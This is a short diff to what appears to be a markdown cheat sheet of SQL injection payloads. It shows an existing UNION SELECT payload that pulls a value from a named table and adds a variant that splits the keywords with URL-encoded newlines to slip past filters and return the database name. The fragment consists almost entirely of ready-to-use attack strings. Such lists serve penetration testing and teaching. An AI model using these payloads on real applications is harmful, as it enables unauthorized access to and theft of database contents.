@@ -13,6 +13,10 @@
 ```sql
 1' union select (select nameofcolumn from nameoftable limit 0,1),2#
 ```
+*Using Newline*
+```sql
+admin %0A union %0A select %0A 1,database()#
+```
 
 
 
